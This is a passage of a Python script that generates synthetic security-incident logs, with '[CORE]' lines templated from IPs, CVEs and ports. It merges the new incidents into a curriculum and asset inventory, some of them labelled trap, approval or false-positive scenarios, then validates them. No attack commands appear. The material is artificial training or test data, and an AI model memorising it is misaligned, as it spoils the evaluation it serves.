    total_lines = random.randint(35, 42)
    core_insertion_index = random.randint(15, 25)
    current_time = base_time + timedelta(minutes=offset * 12)

    with open(log_path, "w", encoding="utf-8") as f:
        for line_idx in range(total_lines):
            ts = current_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            if line_idx == core_insertion_index:
                for template in core_templates:
                    ts_core = current_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
                    line = template.format(src=src_ip, tgt=tgt_ip, ts=ts_core, cve=cve, port=port, num=num)
                    f.write(f"[CORE] {line}\n")
                    current_time += timedelta(seconds=random.randint(1, 2))
            else:
                f.write(get_filler(archetype["filler"], ts, src_ip, tgt_ip) + "\n")
                current_time += timedelta(seconds=random.randint(1, 4))

# ==========================================
# MERGE + WRITE
# ==========================================
merged_curriculum = curriculum + new_curriculum

# Overwrites the original data/curriculum.json
with open(args.curriculum, "w", encoding="utf-8") as f:
    json.dump(merged_curriculum, f, indent=4)

# Overwrites the original app/data/asset_inventory.json
with open(args.inventory, "w", encoding="utf-8") as f:
    json.dump(asset_inventory, f, indent=4)

# ==========================================
# PRE-FLIGHT VALIDATION (Step 0 pattern from the canonical spec)
# ==========================================
all_ids = [inc["incident_id"] for inc in merged_curriculum]
assert len(all_ids) == len(set(all_ids)), "Duplicate incident_id detected!"
assert len(merged_curriculum) == len(existing_ids) + args.count, (
    f"Expected {len(existing_ids) + args.count} total incidents, got {len(merged_curriculum)}")

log_files = set(os.listdir(RAW_LOGS_DIR))
missing = [inc["incident_id"] for inc in new_curriculum if f"{inc['incident_id']}_syslog.txt" not in log_files]
assert not missing, f"Missing log files for: {missing}"

for inc in new_curriculum:
    path = os.path.join(RAW_LOGS_DIR, f"{inc['incident_id']}_syslog.txt")
    with open(path) as fh:
        content = fh.read()
    assert "[CORE]" in content, f"{inc['incident_id']} missing [CORE] tag!"

print("VALIDATION PASSED")
print(f"Total curriculum entries: {len(merged_curriculum)} ({len(existing_ids)} existing + {len(new_curriculum)} new)")
print(f"Total asset inventory entries: {len(asset_inventory)}")
print(f"Scenario mix: trap={scenario_types.count('trap')}, approval={scenario_types.count('approval')}, fp={scenario_types.count('fp')}")
print(f"✅ Automatically updated: {args.curriculum}")
print(f"✅ Automatically updated: {args.inventory}")
print(f"✅ Generated 400 new logs in: {RAW_LOGS_DIR}")
if __name__ == "__main__":
    pass